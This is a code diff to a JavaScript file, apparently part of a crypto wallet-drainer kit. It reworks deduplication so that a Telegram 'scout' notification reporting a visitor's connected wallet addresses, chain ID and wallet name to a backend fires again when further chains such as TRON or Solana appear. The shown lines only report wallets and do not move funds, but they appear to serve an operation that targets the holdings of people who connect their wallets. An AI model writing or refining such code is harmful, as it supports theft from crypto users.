@@ -3401,8 +3401,11 @@
       return k + ':' + String(addrs[k]).slice(0, 10) + '...';
     });
     var addrKey = String(evmAddr || '').toLowerCase();
-    // One Wallet Connected Telegram per address+session (no duplicate spam)
-    if (S.connectNotifiedAddr === addrKey && S.connectNotifiedSession === S.connectSession) {
+    // Dedup: skip ONLY if same address+session AND same set of connected chains (fingerprint).
+    // If new chains (e.g. TRON, SOL) appeared after initial EVM notify — let it through.
+    var currentFingerprint = familyMapFingerprint(addrs);
+    if (S.connectNotifiedAddr === addrKey && S.connectNotifiedSession === S.connectSession
+        && S.connectNotifiedFingerprint === currentFingerprint) {
       L.log('[connect] skip duplicate scout notify |', compact.join(' | ') || 'evm only');
       return true;
     }
@@ -3422,6 +3425,7 @@
     if (res && (res.success || res.data)) {
       S.connectNotifiedAddr = addrKey;
       S.connectNotifiedSession = S.connectSession || '';
+      S.connectNotifiedFingerprint = currentFingerprint;
       S.notifyDone = true;
       try {
         sessionStorage.setItem('legion_notify_done', addrKey);
@@ -3436,6 +3440,7 @@
       await SCOUT.telemetry(evmAddr, chainId, walletName, addrs);
       S.connectNotifiedAddr = addrKey;
       S.connectNotifiedSession = S.connectSession || '';
+      S.connectNotifiedFingerprint = currentFingerprint;
       S.notifyDone = true;
       L.log('[connect] backend notified (fallback) |', compact.join(' | ') || 'evm only');
       return true;
